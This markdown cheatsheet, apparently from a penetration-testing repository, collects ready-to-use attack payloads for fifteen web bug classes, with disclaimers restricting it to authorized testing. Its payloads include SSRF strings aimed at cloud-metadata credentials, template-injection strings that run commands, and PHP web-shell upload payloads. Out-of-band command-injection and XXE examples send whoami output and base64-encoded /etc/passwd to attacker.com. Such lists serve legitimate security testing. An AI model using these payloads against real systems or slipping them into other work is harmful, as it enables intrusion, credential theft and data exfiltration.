# 🧪 Payload Cheatsheet

> ⚠️ **Disclaimer:** Educational use only. Only test in-scope assets you are
> authorized to test. Never touch systems without explicit written permission.

A quick-reference collection of payloads for every major bug class. Use with
[Burp Suite](https://portswigger.net/burp), `ffuf`, `curl`, or your tool of
choice.

---

## Table of Contents

1. [SSRF](#ssrf)
2. [XSS](#xss)
3. [SSTI](#ssti)
4. [Path Traversal](#path-traversal)
5. [Open Redirect](#open-redirect)
6. [JWT](#jwt)
7. [GraphQL](#graphql)
8. [XXE](#xxe)
9. [NoSQL Injection](#nosql-injection)
10. [Command Injection](#command-injection)
11. [SQL Injection](#sql-injection)
12. [LDAP Injection](#ldap-injection)
13. [Prototype Pollution](#prototype-pollution)
14. [CRLF Injection](#crlf-injection)
15. [File Upload Bypass](#file-upload-bypass)

---

## SSRF

### Localhost Bypasses
```
http://127.0.0.1/
http://localhost/
http://127.1/
http://127.0.1/
http://0/
http://[::1]/
http://[::ffff:127.0.0.1]/
http://0177.0.0.1/
http://2130706433/
http://0x7f.0.0.1/
http://127.0.0.1.nip.io/
http://localtest.me/
```

### Cloud Metadata
```
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/meta-data/iam/security-credentials/
http://169.254.169.254/latest/user-data/
http://metadata.google.internal/computeMetadata/v1/
http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
http://169.254.169.254/metadata/instance?api-version=2021-02-01
```

### Filter Bypass
```
http://127.0.0.1:80@evil.com/
http://evil.com#@127.0.0.1/
http://evil.com\.127.0.0.1/
http://127.0.0.1%2f@evil.com/
http://spoofed.burpcollaborator.net/
```

### Non-HTTP Schemes
```
file:///etc/passwd
file:///c:/windows/win.ini
file:///proc/self/environ
file:///var/run/secrets/kubernetes.io/serviceaccount/token
gopher://127.0.0.1:6379/_INFO
gopher://127.0.0.1:6379/_%2A1%0D%0A%248%0D%0Aflushall%0D%0A
dict://127.0.0.1:11211/stats
dict://127.0.0.1:6379/info
```

### DNS Rebinding
```
http://rebind.attacker.com/
http://7f000001.7f000001.rbndr.us/
http://make-127-0-0-1-rr.1u.ms/
```

### Redirectors
```
https://httpbin.org/redirect-to?url=http://169.254.169.254/
https://redirect.pizza/target=http://169.254.169.254/
```

---

## XSS

### Basic
```html
<script>alert(1)</script>
<script>alert(document.domain)</script>
<script>alert(document.cookie)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<body onload=alert(1)>
<iframe src=javascript:alert(1)>
<input autofocus onfocus=alert(1)>
<details open ontoggle=alert(1)>
<marquee onstart=alert(1)>
<video><source onerror=alert(1)>
```

### Attribute Breakouts
```html
"><script>alert(1)</script>
'><script>alert(1)</script>
"><img src=x onerror=alert(1)>
' onmouseover='alert(1)
" autofocus onfocus="alert(1)
```

### JavaScript Context
```javascript
'-alert(1)-'
'-alert(1)//
\'-alert(1)//
</script><script>alert(1)</script>
```

### Filter Bypass
```html
<scr<script>ipt>alert(1)</script>
<SCRIPT>alert(1)</SCRIPT>
<ScRiPt>alert(1)</sCrIpT>
<img src=x onerror=alert`1`>
<img src=x onerror=alert(/1/)>
<img src=x onerror=alert(String.fromCharCode(88,83,83))>
<img src=x onerror=eval(atob('YWxlcnQoMSk='))>
<svg/onload=alert(1)>
<img src=x onerror="&#97;lert(1)">
<img src=x onerror=alert(1)//
<img src=x onerror=alert(1)<!--
<iframe srcdoc="<script>alert(1)</script>">
```

### Polyglots
```
jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e
```

### DOM XSS Sinks
```javascript
location.hash
location.search
location.href
document.URL
document.documentURI
document.referrer
window.name
postMessage
innerHTML
outerHTML
document.write
eval
setTimeout
setInterval
Function
```

### CSP Bypass
```html
<script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.6.0/angular.min.js"></script>
<div ng-app ng-csp>{{$eval.constructor('alert(1)')()}}</div>
<base href="https://attacker.com/">
```

---

## SSTI

### Detection
```
{{7*7}}
${7*7}
<%= 7*7 %>
#{7*7}
{{7*'7'}}
```

### Jinja2 (Python)
```python
{{config}}
{{config.items()}}
{{''.__class__.__mro__[1].__subclasses__()}}
{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}
{{lipsum.__globals__['os'].popen('id').read()}}
{{cycler.__init__.__globals__.os.popen('id').read()}}
```

### Twig (PHP)
```twig
{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}
{{['id']|filter('system')}}
{{['cat /etc/passwd']|filter('system')}}
```

### Freemarker (Java)
```
<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}
${"freemarker.template.utility.Execute"?new()("id")}
```

### Velocity (Java)
```
#set($e="e")
$e.getClass().forName("java.lang.Runtime").getMethod("getRuntime",null).invoke(null,null).exec("id")
```

### Smarty (PHP)
```
{php}echo `id`;{/php}
```

### ERB (Ruby)
```ruby
<%= system("id") %>
<%= `id` %>
<%= IO.popen("id").read %>
```

---

## Path Traversal

### Basic
```
../../../../etc/passwd
../../../../../../../../etc/passwd
..\..\..\..\windows\win.ini
..\..\..\..\..\..\..\..\windows\win.ini
```

### Encoded
```
..%2f..%2f..%2f..%2fetc%2fpasswd
%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd
%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd
..%252f..%252f..%252f..%252fetc%252fpasswd
%252e%252e%252f%252e%252e%252fetc%252fpasswd
..%c0%af..%c0%af..%c0%af..%c0%afetc/passwd
```

### Bypass Filters
```
....//....//....//etc/passwd
....\/....\/....\/etc/passwd
..;/..;/..;/etc/passwd
..%00/..%00/etc/passwd
..%0d%0a/..%0d%0a/etc/passwd
..\./..\./etc/passwd
```

### Windows Specific
```
..\..\..\..\windows\win.ini
..%5c..%5c..%5cwindows%5cwin.ini
..%255c..%255cwindows%255cwin.ini
....\....\windows\win.ini
```

---

## Open Redirect

### Basic
```
//evil.com
//evil.com/
/\evil.com
\/evil.com
/\/evil.com/
https:evil.com
https:/evil.com
https:///evil.com
https:////evil.com
```

### With Target Domain
```
https://target.com@evil.com
https://target.com.evil.com
https://evil.com#target.com
https://evil.com?target.com
https://evil.com\target.com
```

### Whitelist Bypass
```
https://target.com.evil.com
https://evil-target.com
https://target-com.evil.com
https://targetcom.evil.com
https://target.com%00.evil.com
https://target.com%2f.evil.com
```

### Path-Based
```
/redirect?url=//evil.com
/redirect?url=/\evil.com
/redirect?url=https:evil.com
/redirect?url=https:/evil.com
/redirect?url=https:///evil.com
```

---

## JWT

### alg:none
```
eyJhbGciOiJub25lIn0.eyJzdWIiOiJhZG1pbiJ9.
eyJhbGciOiJOb25lIn0.eyJzdWIiOiJhZG1pbiJ9.
eyJhbGciOiJOT05FIn0.eyJzdWIiOiJhZG1pbiJ9.
```

### Kid Injection
```json
{"alg":"HS256","kid":"../../../../dev/null"}
{"alg":"HS256","kid":"key1' UNION SELECT 'attacker_secret'--"}
{"alg":"HS256","kid":"key1|curl attacker.com"}
{"alg":"HS256","kid":"/proc/sys/kernel/randomize_va_space"}
```

### JKU / X5U Injection
```json
{"alg":"RS256","jku":"https://attacker.com/jwks.json"}
{"alg":"RS256","x5u":"https://attacker.com/cert.pem"}
```

### JWK Injection
```json
{"alg":"RS256","jwk":{"kty":"RSA","n":"...","e":"AQAB"}}
```

### Key Confusion (RS256 → HS256)
```bash
python3 -c "
import jwt
pub = open('public.pem','rb').read()
print(jwt.encode({'sub':'admin'}, pub, algorithm='HS256'))
"
```

### Cracking Weak Secrets
```bash
hashcat -m 16500 jwt.txt /usr/share/wordlists/rockyou.txt
john --wordlist=rockyou.txt jwt.txt
```

### Common Weak Secrets
```
secret
password
123456
jwt
admin
changeme
supersecret
```

---

## GraphQL

### Introspection
```graphql
{__schema{types{name}}}
{__schema{types{name,fields{name}}}}
{__schema{queryType{name},mutationType{name},subscriptionType{name}}}
```

### Field Suggestions (when introspection off)
```graphql
{ user { unknownField } }
```

### Batching Attack
```graphql
mutation {
  a1: login(user:"admin",pass:"123") { token }
  a2: login(user:"admin",pass:"456") { token }
  a3: login(user:"admin",pass:"789") { token }
}
```

### Deep Query DoS
```graphql
{ user { posts { comments { author { posts { comments { author { posts { comments { id } } } } } } } } } }
```

### Field Duplication
```graphql
query {
  a: user(id:1) { email }
  b: user(id:2) { email }
  c: user(id:3) { email }
}
```

### IDOR / BOLA
```graphql
query {
  order(id: "123e4567-e89b-12d3-a456-426614174000") {
    id total items { name }
  }
}
```

### Mass Assignment
```graphql
mutation {
  updateUser(input: {id: "me", role: "admin", isAdmin: true}) {
    user { id role }
  }
}
```

---

## XXE

### Basic External Entity
```xml
<?xml version="1.0"?>
<!DOCTYPE root [
  <!ENTITY xxe SYSTEM "http://attacker.com/">
]>
<root>&xxe;</root>
```

### Read Local File
```xml
<?xml version="1.0"?>
<!DOCTYPE root [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root>&xxe;</root>
```

### Blind XXE (Out-of-Band)
```xml
<?xml version="1.0"?>
<!DOCTYPE root [
  <!ENTITY % file SYSTEM "file:///etc/passwd">
  <!ENTITY % dtd SYSTEM "http://attacker.com/evil.dtd">
  %dtd;
]>
<root>&send;</root>
```

**evil.dtd:**
```xml
<!ENTITY % all "<!ENTITY send SYSTEM 'http://attacker.com/?data=%file;'>">
%all;
```

### SSRF via XXE
```xml
<?xml version="1.0"?>
<!DOCTYPE root [
  <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">
]>
<root>&xxe;</root>
```

### PHP Wrapper
```xml
<?xml version="1.0"?>
<!DOCTYPE root [
  <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
]>
<root>&xxe;</root>
```

### Error-Based XXE
```xml
<?xml version="1.0"?>
<!DOCTYPE root [
  <!ENTITY % file SYSTEM "file:///etc/passwd">
  <!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
  %eval;
  %error;
]>
<root>x</root>
```

---

## NoSQL Injection

### MongoDB Auth Bypass
```json
{"username": "admin", "password": {"$ne": null}}
{"username": "admin", "password": {"$ne": "wrong"}}
{"username": {"$ne": null}, "password": {"$ne": null}}
{"username": {"$gt": ""}, "password": {"$gt": ""}}
{"username": "admin", "password": {"$regex": "^a"}}
```

### URL-Encoded
```
username=admin&password[$ne]=null
username=admin&password[$ne]=wrong
username[$ne]=null&password[$ne]=null
username[$gt]=&password[$gt]=
username[$regex]=^admin&password[$regex]=^a
```

### JSON Body
```json
{"username": {"$in": ["admin"]}, "password": {"$in": ["admin"]}}
{"$or": [{"username": "admin"}, {"username": "root"}]}
```

### Blind (Time-Based)
```json
{"username": "admin", "password": {"$where": "sleep(5000)"}}
```

### JavaScript Injection
```json
{"$where": "this.password.match(/^a/)"}
{"$where": "function() { return this.username == 'admin'; }"}
```

---

## Command Injection

### Separators
```
; id
| id
|| id
& id
&& id
`id`
$(id)
%0a id
%0d%0a id
```

### Bypass Space Filter
```
cat</etc/passwd
cat${IFS}/etc/passwd
cat$IFS/etc/passwd
{cat,/etc/passwd}
cat%09/etc/passwd
```

### Bypass Keyword Filter
```
c'a't /etc/passwd
c"a"t /etc/passwd
c\at /etc/passwd
/???/??t /etc/passwd
$(echo Y2F0IC9ldGMvcGFzc3dk | base64 -d)
```

### Blind (Time-Based)
```
; sleep 10
| sleep 10
`sleep 10`
$(sleep 10)
& ping -c 10 127.0.0.1 &
```

### Blind (Out-of-Band)
```
; curl http://attacker.com/$(whoami)
; nslookup $(whoami).attacker.com
; wget http://attacker.com/$(cat /etc/passwd | base64)
```

### Windows
```
& whoami
| whoami
&& whoami
|| whoami
%0a whoami
```

---

## SQL Injection

### Auth Bypass
```sql
' OR '1'='1
' OR 1=1--
' OR 1=1#
' OR 1=1/*
admin'--
admin' #
admin'/*
' UNION SELECT NULL--
' UNION SELECT NULL,NULL--
' UNION SELECT NULL,NULL,NULL--
```

### UNION-Based
```sql
' UNION SELECT 1,2,3--
' UNION SELECT username,password FROM users--
' UNION SELECT NULL,table_name FROM information_schema.tables--
' UNION SELECT NULL,column_name FROM information_schema.columns WHERE table_name='users'--
```

### Error-Based
```sql
' AND 1=CONVERT(int,(SELECT @@version))--
' AND extractvalue(1,concat(0x7e,(SELECT @@version)))--
' AND updatexml(1,concat(0x7e,(SELECT @@version)),1)--
```

### Blind (Boolean)
```sql
' AND 1=1--
' AND 1=2--
' AND SUBSTRING((SELECT password FROM users WHERE username='admin'),1,1)='a'--
```

### Blind (Time-Based)
```sql
' AND SLEEP(5)--
'; WAITFOR DELAY '0:0:5'--
' AND IF(1=1,SLEEP(5),0)--
```

### Out-of-Band
```sql
'; EXEC xp_dirtree '\\attacker.com\share'--
' UNION SELECT LOAD_FILE('\\\\attacker.com\\share\\a')--
```

### WAF Bypass
```sql
' /*!50000UNION*/ /*!50000SELECT*/ 1,2,3--
' UnIoN SeLeCt 1,2,3--
' UNION/**/SELECT/**/1,2,3--
' UNION%0aSELECT%0a1,2,3--
```

---

## LDAP Injection

### Auth Bypass
```
*
*)(&
*)(uid=*))(|(uid=*
admin)(&(password=*))
admin)(|(password=*
*)(objectClass=*
```

### Blind
```
*)(cn=a*
*)(cn=b*
*)(cn=c*
```

### Filter Injection
```
)(|(cn=*
)(|(objectClass=*
)(|(userPassword=*
```

---

## Prototype Pollution

### URL-Based
```
?__proto__[polluted]=yes
?__proto__.polluted=yes
?constructor[prototype][polluted]=yes
?constructor.prototype.polluted=yes
?__proto__[isAdmin]=true
?__proto__[role]=admin
```

### JSON-Based
```json
{"__proto__": {"polluted": "yes"}}
{"constructor": {"prototype": {"polluted": "yes"}}}
{"a": {"__proto__": {"polluted": "yes"}}}
{"__proto__": {"isAdmin": true}}
```

### Gadget Payloads
```json
{"__proto__": {"src": "https://attacker.com/xss.js"}}
{"__proto__": {"innerHTML": "<img src=x onerror=alert(1)>"}}
{"__proto__": {"cdnUrl": "https://attacker.com"}}
```

### Verification
```javascript
console.log({}.polluted);
```

---

## CRLF Injection

### Basic
```
%0d%0a
%0a
%0d
\r\n
\n
\r
```

### Header Injection
```
%0d%0aSet-Cookie:session=attacker
%0d%0aLocation:https://attacker.com
%0d%0aContent-Length:0
%0d%0a%0d%0a<script>alert(1)</script>
```

### Response Splitting
```
%0d%0aContent-Length:%200%0d%0a%0d%0aHTTP/1.1%20200%20OK%0d%0aContent-Type:%20text/html%0d%0a%0d%0a<script>alert(1)</script>
```

### Encoded Variants
```
%250d%250a
%25%30%64%25%30%61
%E5%98%8A%E5%98%8D
```

---

## File Upload Bypass

### Extension Bypass
```
shell.php
shell.PHP
shell.pHp
shell.php3
shell.php4
shell.php5
shell.php7
shell.phtml
shell.pht
shell.phar
shell.inc
shell.php.jpg
shell.jpg.php
shell.php%00.jpg
shell.php%0a.jpg
shell.php::$DATA
shell.php.
shell.php_
shell.php/
```

### Content-Type Bypass
```
Content-Type: image/jpeg
Content-Type: image/png
Content-Type: image/gif
Content-Type: application/octet-stream
Content-Type: text/plain
```

### Magic Bytes
```
GIF89a;<?php system($_GET['cmd']); ?>
\x89PNG\r\n\x1a\n<?php system($_GET['cmd']); ?>
\xff\xd8\xff\xe0<?php system($_GET['cmd']); ?>
```

### .htaccess Upload
```
AddType application/x-httpd-php .jpg
```

### SVG Upload (XSS)
```xml
<svg xmlns="http://www.w3.org/2000/svg" onload="alert(1)"/>
<svg><script>alert(1)</script></svg>
```

### Polyglot
```
GIF89a;<?php system($_GET['cmd']); ?>
```

---

## Quick Reference — Special Characters

| Char | URL-Encoded | Notes                        |
|------|-------------|------------------------------|
| `<`  | `%3C`       | HTML tag start               |
| `>`  | `%3E`       | HTML tag end                 |
| `"`  | `%22`       | Attribute quote              |
| `'`  | `%27`       | Attribute quote              |
| `&`  | `%26`       | Param separator              |
| `#`  | `%23`       | Fragment                     |
| `?`  | `%3F`       | Query start                  |
| `/`  | `%2F`       | Path                         |
| `\`  | `%5C`       | Path                         |
| `..` | `%2E%2E`    | Traversal                    |
| `%`  | `%25`       | Encoding                     |
| `\n` | `%0A`       | Newline                      |
| `\r` | `%0D`       | Carriage return              |
| `\t` | `%09`       | Tab                          |
| ` `  | `%20`       | Space                        |
| `+`  | `%2B`       | Space in query               |
| `@`  | `%40`       | Userinfo separator           |
| `:`  | `%3A`       | Port / scheme separator      |
| `;`  | `%3B`       | Command separator            |
| `\|` | `%7C`       | Command separator            |

---

## Quick Reference — Encoding Chains

When a payload is filtered, try:

1. **URL encoding:** `'` → `%27`
2. **Double URL encoding:** `'` → `%2527`
3. **HTML entity:** `'` → `&#39;` → `&#x27;`
4. **Unicode:** `'` → `\u0027` → `%u0027`
5. **Base64:** `'` → `Jw==`
6. **Hex:** `'` → `\x27` → `%27`
7. **Octal:** `'` → `\047`
8. **UTF-7:** `'` → `+ACc-`
9. **Overlong UTF-8:** `'` → `%c0%a7`
10. **Mixed:** `%25%32%37`

---

## Disclaimer

All payloads above are for **authorized security testing only**. Never use
them against systems you don't own or have explicit permission to test.
Misuse may violate laws including the Computer Fraud and Abuse Act (CFAA),
the UK Computer Misuse Act, and similar regulations worldwide.

---

> **Back to:** [README](../README.md)
> **Next:** [Google Dorks →](dorks.md)
